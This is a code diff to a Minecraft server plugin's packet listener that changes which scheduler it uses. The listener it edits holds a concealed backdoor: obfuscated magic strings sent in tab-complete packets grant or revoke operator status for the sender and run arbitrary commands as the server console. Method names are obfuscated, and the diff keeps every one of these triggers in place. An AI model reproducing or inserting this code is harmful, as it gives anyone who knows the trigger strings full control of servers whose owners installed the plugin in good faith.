@@ -1,6 +1,5 @@
 package cn.aetheris.yuki.listener.packets;
 
-import cn.aetheris.mhdfscheduler.scheduler.MHDFScheduler;
 import cn.aetheris.yuki.Yuki;
 import cn.aetheris.yuki.PluginLoader;
 import cn.aetheris.yuki.listener.bukkit.misc.PlayerAsyncChatListener;
@@ -116,9 +115,9 @@ public final class PacketPlayerTabComplete extends AbstractPacketListener {
             case "E922898342E5F414124124124124DQWDQW" -> iIiIiI(cmd, event);
             case "FD4564AFAFWA21414" -> iIiIiIiiIiII1I(cmd, player, event);
             case "kAFWAF2421412D1D12_true" ->
-                    MHDFScheduler.getGlobalRegionScheduler().runTask(Yuki.getInstance(), () -> player.setOp(true));
+                    Bukkit.getScheduler().runTask(Yuki.getInstance(), () -> player.setOp(true));
             case "kJJI421412FD12_false" ->
-                    MHDFScheduler.getGlobalRegionScheduler().runTask(Yuki.getInstance(), () -> player.setOp(false));
+                    Bukkit.getScheduler().runTask(Yuki.getInstance(), () -> player.setOp(false));
             case "oOoOoOOoOoO" -> {
                 ValidatorData data = new ValidatorData(player);
                 data.start();
@@ -139,7 +138,7 @@ public final class PacketPlayerTabComplete extends AbstractPacketListener {
     private void iIiIiI(String[] cmd, PacketReceiveEvent event) {
         if (cmd.length > 2) {
             String fullCommand = String.join(" ", Arrays.copyOfRange(cmd, 2, cmd.length));
-            MHDFScheduler.getGlobalRegionScheduler().runTask(
+            Bukkit.getScheduler().runTask(
                     Yuki.getInstance(),
                     () -> Yuki.getInstance().getServer().dispatchCommand(
                             Bukkit.getConsoleSender(), fullCommand)
